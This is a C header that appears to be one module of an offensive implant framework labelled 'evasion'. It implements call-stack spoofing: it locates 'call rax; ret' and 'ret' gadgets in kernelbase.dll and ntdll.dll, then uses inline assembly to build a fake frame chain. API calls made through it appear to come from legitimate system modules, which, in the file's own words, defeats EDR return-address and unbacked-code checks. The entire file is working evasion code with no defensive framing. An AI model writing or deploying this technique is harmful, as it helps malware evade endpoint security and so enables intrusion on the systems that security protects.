// chunk: evasion/stack_spoof_gadget
// depends: (none)
// provides: spoof_call
// risk: none
// note: System DLL gadget trampoline — finds a 'call rax; ret' or 'call [rbx]; ret'
//       gadget inside kernelbase.dll and routes all sensitive API calls through it.
//       The call instruction executes from kernelbase's address range, so the EDR's
//       return-address check sees a legitimate module. Simpler than full ROP but
//       highly effective against unbacked-code detection.

#ifndef CHUNK_STACK_SPOOF_GADGET
#define CHUNK_STACK_SPOOF_GADGET

#include <windows.h>

static PVOID _tramp_gadget = NULL;   /* call rax; ... ; ret gadget */
static PVOID _ret_ntdll = NULL;
static PVOID _ret_kb = NULL;
static int _gadget_init = 0;

static PVOID _scan_for_bytes(HMODULE mod, BYTE *pattern, int len, DWORD skip) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pe);

    for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *base = (BYTE*)mod + sec->VirtualAddress;
        BYTE *end = base + sec->Misc.VirtualSize;
        BYTE *start = base + skip;
        if (start >= end) start = base;
        for (BYTE *p = start; p < end - len; p++) {
            int ok = 1;
            for (int j = 0; j < len; j++) {
                if (p[j] != pattern[j]) { ok = 0; break; }
            }
            if (ok) return p;
        }
    }
    return NULL;
}

static void _init_gadgets(void) {
    if (_gadget_init) return;

    HMODULE kb = GetModuleHandleA("kernelbase.dll");
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (!kb || !nt) return;

    /* Find 'call rax; ret' = FF D0 C3 in kernelbase */
    BYTE call_rax_ret[] = {0xFF, 0xD0, 0xC3};
    _tramp_gadget = _scan_for_bytes(kb, call_rax_ret, 3, 0);

    if (!_tramp_gadget) {
        /* Fallback: 'call rax; nop; ret' = FF D0 90 C3 */
        BYTE call_rax_nop_ret[] = {0xFF, 0xD0, 0x90, 0xC3};
        _tramp_gadget = _scan_for_bytes(kb, call_rax_nop_ret, 4, 0);
    }

    /* Grab ret gadgets for deepening the fake chain */
    BYTE ret_pat[] = {0xC3};
    _ret_kb = _scan_for_bytes(kb, ret_pat, 1, 0x800);
    _ret_ntdll = _scan_for_bytes(nt, ret_pat, 1, 0x400);

    _gadget_init = (_tramp_gadget != NULL);
}

/*
 * spoof_call: Execute func through a kernelbase gadget trampoline.
 * Puts func ptr in rax, arguments in rcx/rdx/r8/r9, then jumps to
 * the 'call rax; ret' gadget in kernelbase. The call instruction
 * and return address both reside in kernelbase's address range.
 */
static PVOID spoof_call(PVOID func, int nargs, ...) {
    _init_gadgets();

    va_list ap;
    va_start(ap, nargs);
    PVOID a0 = nargs > 0 ? va_arg(ap, PVOID) : NULL;
    PVOID a1 = nargs > 1 ? va_arg(ap, PVOID) : NULL;
    PVOID a2 = nargs > 2 ? va_arg(ap, PVOID) : NULL;
    PVOID a3 = nargs > 3 ? va_arg(ap, PVOID) : NULL;
    va_end(ap);

    if (!_gadget_init) {
        typedef PVOID (*fn4)(PVOID, PVOID, PVOID, PVOID);
        return ((fn4)func)(a0, a1, a2, a3);
    }

    PVOID result = NULL;

    __asm__ __volatile__ (
        "mov %%rsp, %%r14\n\t"
        "mov %%rbp, %%r15\n\t"
        /* Build a fake frame chain for the unwinder */
        "sub $0x60, %%rsp\n\t"
        "and $0xFFFFFFFFFFFFFFF0, %%rsp\n\t"
        /* Fake deepest frame: ntdll ret */
        "push %[ret_nt]\n\t"
        "push %%rsp\n\t"
        "mov %%rsp, %%rbp\n\t"
        /* Fake mid frame: kernelbase ret */
        "push %[ret_kb]\n\t"
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"
        /* Load func into rax for the 'call rax' gadget */
        "mov %[fn], %%rax\n\t"
        /* Set up arguments */
        "mov %[a0], %%rcx\n\t"
        "mov %[a1], %%rdx\n\t"
        "mov %[a2], %%r8\n\t"
        "mov %[a3], %%r9\n\t"
        /* Shadow space */
        "sub $0x20, %%rsp\n\t"
        /* Call through the kernelbase gadget */
        "call *%[gadget]\n\t"
        "mov %%rax, %[res]\n\t"
        "mov %%r14, %%rsp\n\t"
        "mov %%r15, %%rbp\n\t"
        : [res] "=m"(result)
        : [fn] "r"(func), [gadget] "r"(_tramp_gadget),
          [a0] "m"(a0), [a1] "m"(a1), [a2] "m"(a2), [a3] "m"(a3),
          [ret_nt] "r"(_ret_ntdll), [ret_kb] "r"(_ret_kb)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "r14", "r15", "memory"
    );

    return result;
}

#endif
